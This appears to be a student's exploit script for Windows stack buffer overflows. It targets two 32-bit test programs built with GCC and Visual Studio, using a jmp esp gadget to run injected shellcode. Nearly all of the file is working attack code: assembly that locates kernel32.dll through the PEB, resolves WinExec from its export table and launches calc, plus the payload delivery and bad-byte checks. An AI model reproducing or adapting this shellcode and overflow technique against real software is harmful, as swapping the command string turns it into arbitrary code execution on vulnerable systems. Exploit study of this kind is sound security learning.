# 7th exploit, but nicer

import sys

from pwintools import *

# 64 bit has non-executable stack
processes = [
	Process('2_gets_bs_gcc_32.exe'),
	Process('2_gets_bs_vs_32.exe'),
]

retAddrOffs = [
	48,
	40,
]

# jmp esp
jmpEspAddr = [
	0x401712,
	0x4070CA,
]

injection = asm(
	'base:'
	'jmp entry;'
	'getBase:'
	'mov eax, [esp];'
	'ret;'

	'kernelName: .asciz "K\\0E\\0R\\0N\\0E\\0L\\0003\\0002\\0.\\0D\\0L\\0L\\0\\0";'
	'winExecName: .asciz "WinExec";' # strlen+null is 8

	'strlenPlusOne:' # string in edi, ret in ecx
	'or ecx, -1;'
	'xor al, al;'
	'repne scasb;'
	'not ecx;'
	# 'dec ecx;'
	'ret;'

	# # STDCALL const char ** searchStr(const char ** first, const char ** last, HINSTANCE base, const char * needle)
	'searchStr:'
	'push esi;'
	'push edi;'
	'mov edi, [esp + 0x18];'
	'call strlenPlusOne;'
	'mov edx, ecx;'
	'mov eax, [esp + 0xc];'
	'jmp loopEnter;'
	'loopBegin:'
	'mov esi, [eax];'
	'add esi, [esp + 0x14];'
	'mov edi, [esp + 0x18];'
	'mov ecx, edx;'
	'repe cmpsb;'
	'je found;'
	'add eax, 4;'
	'loopEnter:'
	'cmp eax, [esp + 0x10];'
	'jbe loopBegin;'
	'jmp 0xdeadc0de;' # TODO error handling?
	'found:'
	'pop edi;'
	'pop esi;'
	'ret 16;'

	'entry:'
	# fetch loaded DLL list
	'mov eax, fs:[0x30];' # PEB pointer inside TEB
	'mov eax, [eax + 0xc];' # PEB_LDR_DATA *Ldr
	'mov ebx, [eax + 0x14];' # (LIST_ENTRY InMemoryOrderModuleList).forwardLink
	'sub ebx, 8;' # this yields the base of the LIST_ENTRY

	'call getBase;'
	'here:'
	'sub eax, here - base;'
	'push eax;'
	# 'lea edx, [eax + kernelName - base];' # this yields lea edx, [eax], nice job capstone
	'mov edx, eax;'
	'add edx, kernelName;'
	'sub edx, base;'

	# search for kernel32.dll
	'lookForKernel32:'							
	'mov esi, [ebx + 0x30];' # UNICODE_STRING BaseDllName
	'mov edi, edx;'
	'mov ecx, 12;' # strlen("KERNEL32.DLL") + 1
	'inc ecx;' # 13 is forbidden

	# strncmp for wstring
	'repe cmpsw;'

	'je foundKernel;'

	# prepare for next iteration
	'mov ebx, [ebx + 0x08];' # (LIST_ENTRY InMemoryOrderLinks).forwardLink
	'test ebx, ebx;'
	'jz die;'
	'sub ebx, 8;' # TODO explain
	'jmp lookForKernel32;'
	'die:'
	'mov [ebx], eax;' # idk what to do

	'foundKernel:'

	'mov eax, [ebx + 0x18];' # DllBase
	
	# parse kernel32.dll's PE header to find WinExec
	# 'mov [esp], eax;' # save base
	'push eax;' # stack: kernel base, shellcode base
	'add eax, [eax + 0x3c];' # offset of PE signature
	'lea esi, [eax + 4];' # COFF file header
	'lea edi, [esi + 20];' # optional header is after the COFF file header
	'movzx eax, word ptr [edi + 0];' # magic (PE32 or PE32+)
	'mov ecx, 112;' # offset in PE32+
	'cmp eax, 0x10b;' # PE32
	'mov eax, 96;' # offset in PE32
	'cmove ecx, eax;'
	'mov eax, [edi + ecx + 0];' # export directory table
	'add eax, [esp];' # rva to va
	'push eax;' # stack: EDT, kernel base, shellcode base

	'mov ebx, eax;' # EDT in ebx
	'mov ecx, [esp + 8];'
	'add ecx, winExecName;' # function to search
	'mov edi, [ebx + 32];' # Name Pointer Table rva
	'add edi, [esp + 4];' # rva to va
	'mov eax, [ebx + 24];' # number of names
	'dec eax;'
	'shl eax, 2;'
	'add eax, edi;' # last name in the table

	'mov edx, [esp + 4];'
	'push ecx;'
	'push edx;'
	'push eax;'
	'push edi;'
	'call searchStr;'
	'sub eax, edi;'
	'shr eax, 1;' # elements in name table are 4 bytes, while in ordinal table 2
	'add eax, [ebx + 36];' # ordinal table rva
	'add eax, [esp + 4];' # rva to va
	'movzx eax, word ptr [eax];' # ordinal export number
	# 'sub eax, [ebx + 16];' # subtract first ordinal to obtain the index
	'shl eax, 2;'
	'add eax, [ebx + 28];' # rva of exported address table
	'add eax, [esp + 4];' # rva to va
	'mov eax, [eax];' # rva of the function
	'add eax, [esp + 4];' # rva to va

	# WinExec(calc, SW_NORMAL)
	# 'push dword 1;' # this one gets assembled as 'push word 1', OK KEYSTONE
	'mov ecx, 1;' # SW_NORMAL
	'push ecx;'
	'call arg;'
	'.asciz "C:/WINDOWS/system32/calc";'
	'arg:'
	#'add eax, 0x5dcf0;' # WinExec
	'call eax;'

	'int3;',
	# TODO normal exit?
	32

)

for b in injection:
	if b >= 16:
		x = hex(b)[2:]
	else:
		x = '0' + hex(b)[2:]
	print(x, end='')
print()

i = 0
for b in injection:
	if 0x0d == b or 0x0a == b or 0x1a == b: # TODO what tf is 0x1a??
		print('Error: assembly contains', b, 'at offset', i)
		sys.exit()
	i += 1

processes[0].set_timeout(3600000) # to have time to interact with the debugger
input('Press enter after attaching the debugger')

for i in range(len(processes)):
	processes[i].recvuntil(b'name:\r\n')
	print(b'Injecting ' + injection)
	processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection) # + b'tmp' + str(i).encode('ascii') + b'\0')
	print(processes[i].recvall())

# i = 1
# processes[i].recvuntil(b'name:\r\n')
# processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection) # + b'tmp' + str(i).encode('ascii') + b'\0')
# processes[i].interactive()
#print(processes[i].recvall())